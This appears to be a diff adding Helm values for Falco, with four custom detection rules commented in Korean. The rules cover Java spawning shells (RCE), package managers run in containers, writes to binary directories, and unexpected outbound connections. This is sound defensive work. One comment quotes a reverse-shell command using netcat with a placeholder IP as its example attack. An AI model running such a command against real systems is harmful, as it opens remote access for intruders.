@@ -1,0 +1,109 @@
+USER-SUPPLIED VALUES:
+collectors:
+  containerEngine:
+    kind: auto
+customRules:
+  blog-rules.yaml: "# ==================================================================\n#
+    Rule 1: Java Process Spawning Shell (RCE 방어) - CRITICAL\n# ==================================================================\n#
+    목적: Spring Boot(Java) 프로세스가 shell을 실행하면 RCE 공격 의심\n# 예시: Log4Shell, Spring4Shell
+    같은 취약점 악용\n# 정상 시나리오: Java가 shell을 실행할 이유 없음 (0%)\n- rule: Java Process Spawning
+    Shell\n  desc: Detect java process spawning a shell (Likely RCE attack like Log4Shell)\n
+    \ condition: >\n    spawned_process and\n    proc.pname exists and\n    proc.pname
+    in (java, javac) and\n    proc.name in (bash, sh, ksh, zsh, dash) and\n    container\n
+    \ output: >\n    \U0001F6A8 CRITICAL: Java 프로세스가 Shell을 실행했습니다 (RCE 공격 의심!)\n
+    \     (user=%user.name pod=%k8s.pod.name namespace=%k8s.ns.name\n       parent=%proc.pname
+    cmd=%proc.cmdline container=%container.name)\n  priority: CRITICAL\n  tags: [maturity_stable,
+    host, container, process, mitre_execution, T1059, rce, java]\n\n# ==================================================================\n#
+    Rule 2: Package Manager in Container (Immutability 위반) - WARNING\n# ==================================================================\n#
+    목적: 운영 중 컨테이너에서 패키지 설치 감지 (불변성 원칙 위반)\n# 정상 시나리오: 빌드 시에만 패키지 설치, 런타임엔 절대 안 함\n#
+    악의적 시나리오: 해커가 공격 도구 설치 (netcat, nmap 등)\n- rule: Launch Package Management Process
+    in Container\n  desc: Package management process ran inside container (Immutability
+    violation)\n  condition: >\n    spawned_process and\n    container and\n    proc.name
+    in (apk, apt, apt-get, yum, rpm, dnf, pip, pip3, npm) and\n    not proc.pname
+    in (package_mgmt_binaries)\n  output: >\n    ⚠️ WARNING: 컨테이너 내부에서 패키지 관리자가 실행되었습니다!\n
+    \     (user=%user.name pod=%k8s.pod.name namespace=%k8s.ns.name\n       cmd=%proc.cmdline
+    container=%container.name)\n  priority: WARNING\n  tags: [maturity_stable, container,
+    process, mitre_execution, T1059]\n\n# ==================================================================\n#
+    Rule 3: Write to Binary Directory (Drift Detection) - ERROR\n# ==================================================================\n#
+    목적: 시스템 디렉토리에 파일 쓰기 시도 감지 (악성코드 설치)\n# 정상 시나리오: /bin, /usr/bin, /sbin은 읽기 전용\n#
+    악의적 시나리오: 백도어 바이너리 설치, rootkit 설치\n- rule: Write to Binary Dir\n  desc: Attempt
+    to write to system binary directories\n  condition: >\n    open_write and\n    container
+    and\n    (fd.name startswith /bin/ or\n     fd.name startswith /usr/bin/ or\n
+    \    fd.name startswith /sbin/ or\n     fd.name startswith /usr/sbin/)\n  output:
+    >\n    \U0001F534 ERROR: 바이너리 디렉토리에 쓰기 시도 감지!\n    (user=%user.name file=%fd.name
+    pod=%k8s.pod.name\n     namespace=%k8s.ns.name cmd=%proc.cmdline container=%container.name)\n
+    \ priority: ERROR\n  tags: [maturity_stable, container, filesystem, mitre_persistence,
+    T1543]\n\n# ==================================================================\n#
+    Rule 4: Unexpected Outbound Connection (Reverse Shell 방어) - NOTICE\n# ==================================================================\n#
+    목적: 예상치 못한 외부 연결 감지 (C&C 서버 통신, 데이터 유출)\n# 주의: 노이즈가 많을 수 있으니 초기엔 NOTICE로 설정, 튜닝
+    필요\n# 정상 시나리오: DB(3306), 내부 API(8080), HTTPS(443) 연결\n# 악의적 시나리오: 해커 C&C 서버로 역쉘
+    연결 (nc -e /bin/sh 1.2.3.4 4444)\n- rule: Unexpected Outbound Connection\n  desc:
+    Detect outbound connections to uncommon ports (potential C&C or reverse shell)\n
+    \ condition: >\n    outbound and\n    container and\n    fd.type in (ipv4, ipv6)
+    and\n    not fd.lport in (80, 443, 8080, 3306, 53) and\n    not fd.sip in (\"127.0.0.1\",
+    \"::1\") and\n    not proc.name in (curl, wget, git)\n  output: >\n    \U0001F535
+    NOTICE: 예상치 못한 외부 연결 시도 감지\n    (connection=%fd.name lport=%fd.lport rport=%fd.rport\n
+    \    pod=%k8s.pod.name namespace=%k8s.ns.name\n     cmd=%proc.cmdline container=%container.name)\n
+    \ priority: NOTICE\n  tags: [maturity_incubating, container, network, mitre_exfiltration,
+    T1041]\n"
+driver:
+  kind: modern_ebpf
+falco:
+  grpc:
+    bind_address: unix:///run/falco/falco.sock
+    enabled: true
+    threadiness: 0
+  grpc_output:
+    enabled: true
+  http_output:
+    enabled: true
+    insecure: true
+    url: http://falco-falcosidekick:2801/
+  json_include_output_property: true
+  json_output: true
+  log_level: info
+  priority: info
+falcosidekick:
+  config:
+    loki:
+      hostport: http://loki-stack.monitoring.svc.cluster.local:3100
+      minimumpriority: warning
+    talon:
+      address: http://falco-talon.falco.svc.cluster.local:2803
+      minimumpriority: warning
+  enabled: true
+  resources:
+    limits:
+      cpu: 100m
+      memory: 128Mi
+    requests:
+      cpu: 20m
+      memory: 64Mi
+  webui:
+    enabled: true
+    replicaCount: 1
+    resources:
+      limits:
+        cpu: 100m
+        memory: 128Mi
+      requests:
+        cpu: 20m
+        memory: 64Mi
+podSecurityContext: {}
+resources:
+  limits:
+    cpu: 500m
+    memory: 512Mi
+  requests:
+    cpu: 100m
+    memory: 256Mi
+serviceAccount:
+  create: true
+  name: falco
+tolerations:
+- effect: NoSchedule
+  key: node-role.kubernetes.io/control-plane
+  operator: Exists
+- effect: NoSchedule
+  key: node-role.kubernetes.io/master
+  operator: Exists
